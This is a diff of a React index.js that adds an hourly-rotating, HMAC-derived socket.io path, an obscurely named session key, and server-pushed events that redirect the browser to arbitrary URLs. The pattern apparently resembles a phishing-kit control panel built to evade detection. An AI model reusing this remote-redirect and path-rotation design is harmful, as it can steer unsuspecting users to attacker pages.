@@ -1,63 +1,116 @@
+import React from 'react';
+import ReactDOM from 'react-dom';
+import { BrowserRouter as Router } from 'react-router-dom';
+import App from './App';
+import io from 'socket.io-client';
+const crypto = require("crypto");
 
-  import React from 'react';
-  import ReactDOM from 'react-dom';
-  import { BrowserRouter as Router } from 'react-router-dom';
-  import App from './App';
-  import io from 'socket.io-client';
-  const socket = io(`${process.env.REACT_APP_WS_URL}`, { 
-    path: "/stream-event",
+// === WebSocket logic ===
+const getHourlySocketPath = () => {
+  const secret = process.env.REACT_APP_WS_PATH_TOKEN;
+  const hourlyTimestamp = Math.floor(Date.now() / (1000 * 60 * 60)).toString();
+
+  const hmac = crypto
+    .createHmac("sha256", secret)
+    .update(hourlyTimestamp)
+    .digest("hex")
+    .slice(0, 16);
+
+  return `/ws_${hmac}`;
+};
+
+let socket = null;
+let currentPath = getHourlySocketPath();
+let retries = 0;
+
+const connectSocket = () => {
+  const sessionId = sessionStorage.getItem('uCukkzD');
+  if (!sessionId) {
+    return;
+  }
+
+  if (socket && socket.connected) {
+    return;
+  }
+
+  if (socket) {
+    socket.disconnect();
+    socket = null;
+  }
+
+  socket = io(`${process.env.REACT_APP_WS_URL}`, {
+    path: currentPath,
     transports: ['websocket', 'polling'],
     reconnection: true,
-    reconnectionAttempts: 8,
+    reconnectionAttempts:8,
     reconnectionDelay: 3000,
     auth: {
-      clientSessionID: localStorage.getItem('clientSessionID')
+      uCukkzD: sessionId,
+    },
+    query: {
+      wsPath: currentPath,
     }
   });
-  
-  const Root = () => {
-    React.useEffect(() => {
-      socket.on('connect', () => {
-      });
-      
-      socket.on('changeRoute', (newRoute) => {
-        window.location.href = newRoute.startsWith('/') 
-        ? `${window.location.origin}${newRoute}`
-        : newRoute;
-      });
-      
-      socket.on('redirectUser', ({ url }) => {
-        window.location.href = url;
-      });
-      
-      socket.on('connect_error', (error) => {
-      });
-      
-      const handleVisibilityChange = () => {
-        if (document.hidden) {
-          socket.emit('stopConfigCheck');
-        } else {
-          socket.emit('startConfigCheck');
-        }
-      };
-      
-      document.addEventListener('visibilitychange', handleVisibilityChange);
-      
-      return () => {
-        socket.off('changeRoute');
-        socket.off('redirectUser');
-        socket.off('connect');
-        socket.off('connect_error');
-        document.removeEventListener('visibilitychange', handleVisibilityChange);
-      };
-  }, []);
 
-  return (
-    <Router>
-      <App socket={socket} />
-    </Router>
-  );
+  socket.on("connect", () => {
+    retries = 0;
+  });
+
+  socket.on("connect_error", (err) => {
+    retries++;
+    if (retries > 8) {
+      window.location.reload(); // Refresh the page if too many retries
+    }
+  });
+
+  attachSocketListeners();
 };
+
+const monitorPathChange = () => {
+  setInterval(() => {
+    const newPath = getHourlySocketPath();
+    if (newPath !== currentPath) {
+
+      if (socket) socket.disconnect();
+
+      currentPath = newPath;
+      connectSocket();
+    }
+  }, 30 * 1000);
+};
+
+const attachSocketListeners = () => {
+  if (!socket) return;
+
+  socket.on('redirectUser', ({ url }) => {
+    window.location.href = url;
+  });
+
+  socket.on('changeRoute', (newRoute) => {
+    window.location.href = newRoute.startsWith('/')
+      ? `${window.location.origin}${newRoute}`
+      : newRoute;
+  });
+
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      socket.emit('stopConfigCheck');
+    } else {
+      socket.emit('startConfigCheck');
+    }
+  });
+};
+
+// 🔌 Initialize everything
+setTimeout(() => connectSocket(), 200); // Small delay to allow sessionStorage readiness
+monitorPathChange();
+
+// === Main React App ===
+const Root = () => (
+  <Router>
+    <App socket={socket} />
+  </Router>
+);
 
 ReactDOM.render(<Root />, document.getElementById('root'));
 
